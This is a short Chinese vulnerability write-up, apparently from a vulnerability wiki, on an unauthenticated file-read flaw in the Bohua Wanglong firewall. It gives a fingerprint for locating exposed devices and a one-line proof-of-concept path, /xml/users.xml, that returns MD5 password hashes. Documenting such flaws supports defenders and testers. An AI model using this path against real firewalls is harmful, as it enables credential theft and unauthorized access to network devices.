# 博华网龙防火墙 users.xml 未授权访问

## 漏洞描述

博华网龙防火墙 users.xml文件 可被任意用户读取，其中包含登录的账号密码

## 漏洞影响

<a-checkbox checked>博华网龙防火墙</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"博华网龙防火墙"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1628670749851-c85b5406-15f0-498c-9edd-80b1eb2ac426.png)

验证POC, 读取配置文件获取密码的Md5

```php
/xml/users.xml
```

![img](../../../.vuepress/public/img/1628670712797-5caf4c4d-716b-4aa4-9468-d1ff8c433b66.png)



